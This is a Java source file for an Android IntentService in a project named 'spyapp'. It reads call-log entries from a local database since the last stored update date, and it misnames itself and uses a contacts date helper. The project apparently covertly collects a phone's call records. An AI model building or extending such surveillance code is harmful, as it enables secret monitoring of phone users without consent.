package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.CallLogModel;
import com.app.spyapp.model.ContactModel;

import java.util.ArrayList;


public class CallLogCallService extends IntentService {

    private SpyApp spyApp;

    public CallLogCallService() {
        super(SMSCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<CallLogModel> calllogList = spyApp.getDatabaseHelper().getCallLogList(spyApp.getSharedPreferences().getString(Pref.CALLLOG_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.CALLLOG_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofContact()).apply();
        Log.i("Debug", "onHandleIntent: CAllLogCallService");
    }
}
